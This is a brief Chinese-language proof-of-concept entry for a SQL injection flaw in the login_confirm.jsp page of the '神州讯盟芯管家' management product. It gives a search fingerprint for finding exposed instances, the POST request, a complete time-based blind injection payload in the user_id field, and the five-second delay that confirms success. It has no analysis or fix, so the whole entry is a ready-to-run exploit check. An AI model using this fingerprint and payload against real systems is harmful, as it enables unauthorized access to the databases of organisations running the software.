# 神州讯盟芯管家login_confirm.jsp存在SQL注入漏洞

神州讯盟芯管家 ｜ SQL注入 ｜ —
- **指纹**：`title="神州讯盟芯管家"`
- **请求**：`POST /login_confirm.jsp HTTP/1.1`

**Payload**
```
user_id=1%27;WAITFOR+DELAY+%270:0:5%27--&sn=8&macadress=&wm_types=%C4%A3%CC%AC%B4%B0%BF%DA&url=%2FSunmoIC%2F698D51A19D8A121CE581499D7B701668.jsp&url2=%2FSunmoIC%2F698D51A19D8A121CE581499D7B701668.jsp&password=admin&version=%D6%D0%CE%C4
```
- **响应特征**：200 响应时间>=5s